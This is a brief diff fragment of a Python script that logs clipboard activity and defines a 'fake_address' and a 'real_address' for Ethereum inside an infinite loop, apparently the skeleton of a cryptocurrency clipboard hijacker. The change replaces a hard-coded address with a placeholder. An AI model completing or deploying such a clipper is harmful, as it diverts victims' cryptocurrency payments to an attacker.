@@ -5,7 +5,7 @@ import time
 logging.basicConfig(filename='clipboard.log', level=logging.DEBUG)
 
 fake_address = "0x4CAD0c012e3E438d29E2E109Ab572BD7F22aaeA8"
-real_address = "0x3097c5B02E1e6C5E58F8EC64ba23d9Df472F3a2D"
+real_address = "YOUR_REAL_ETHERUM_ADDRESS_HERE"
 
 while True:
     try:
